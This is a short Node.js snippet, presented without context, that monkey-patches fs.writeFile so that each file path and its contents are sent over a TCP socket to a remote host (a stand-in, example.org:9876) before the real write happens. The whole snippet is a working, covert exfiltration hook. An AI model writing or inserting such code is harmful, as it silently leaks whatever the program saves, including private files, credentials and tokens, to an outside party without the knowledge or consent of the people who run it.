const fs = require("fs");
const net = require("net");
const CONN = { host: "example.org", port: 9876 };
const client = net.createConnection(CONN, () => {});
const _writeFile = fs.writeFile.bind(fs);
fs.writeFile = function () {
  client.write(`${String(arguments[0])}:::${String(arguments[1])}`);
  return _writeFile(...arguments);
};
